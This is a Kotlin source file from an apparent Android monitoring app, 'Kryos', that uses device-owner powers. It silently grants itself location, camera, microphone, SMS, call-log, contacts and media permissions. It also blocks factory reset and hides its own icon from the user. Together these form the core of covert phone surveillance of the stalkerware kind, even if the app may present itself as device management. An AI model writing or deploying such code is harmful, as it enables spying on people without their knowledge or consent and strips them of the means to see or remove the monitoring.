package com.kryos.monitor.command

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.os.UserManager
import android.util.Log
import com.kryos.monitor.receiver.KryosDeviceAdminReceiver

object DeviceLockdownManager {

    private const val TAG = "DeviceLockdown"

    private val RUNTIME_PERMISSIONS = listOf(
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.ACCESS_COARSE_LOCATION,
        android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        android.Manifest.permission.POST_NOTIFICATIONS,
        android.Manifest.permission.READ_PHONE_STATE,
        android.Manifest.permission.CAMERA,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.READ_CALL_LOG,
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.READ_MEDIA_IMAGES,
        android.Manifest.permission.READ_MEDIA_VIDEO
    )

    fun applyLockdown(context: Context) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, KryosDeviceAdminReceiver::class.java)
        val pkg = context.packageName

        if (!dpm.isDeviceOwnerApp(pkg)) {
            Log.w(TAG, "No soy Device Owner todavía, abortando lockdown")
            return
        }

        
        RUNTIME_PERMISSIONS.forEach { permission ->
            try {
                val granted = dpm.setPermissionGrantState(
                    admin,
                    pkg,
                    permission,
                    DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED
                )

                if (granted) {
                    Log.i(TAG, "✅ Permiso administrado: $permission")
                } else {
                    Log.w(TAG, "⚠️ No se pudo administrar: $permission")
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error al administrar $permission", e)
            }
        }

        
        dpm.setPermissionPolicy(
            admin,
            DevicePolicyManager.PERMISSION_POLICY_AUTO_GRANT
        )

        
        dpm.clearUserRestriction(
            admin,
            UserManager.DISALLOW_DEBUGGING_FEATURES
        )
	

	   
    
    dpm.clearUserRestriction(
        admin,
        UserManager.DISALLOW_MODIFY_ACCOUNTS
    )
    
    
    dpm.setAccountManagementDisabled(
        admin, 
        "com.google", 
        false
    )
    
        
        dpm.addUserRestriction(
            admin,
            UserManager.DISALLOW_FACTORY_RESET
        )

        Log.i(TAG, "Lockdown base aplicado correctamente")
    }

    fun lockAppSettingsAccess(context: Context) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, KryosDeviceAdminReceiver::class.java)

        if (!dpm.isDeviceOwnerApp(context.packageName)) return

        Log.i(TAG, "Ocultando Kryos")
        dpm.setApplicationHidden(admin, context.packageName, true)
        Log.i(TAG, "Kryos oculta correctamente")
    }

    fun hasAllFilesAccess(context: Context): Boolean {
        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            true
        }
    }
}
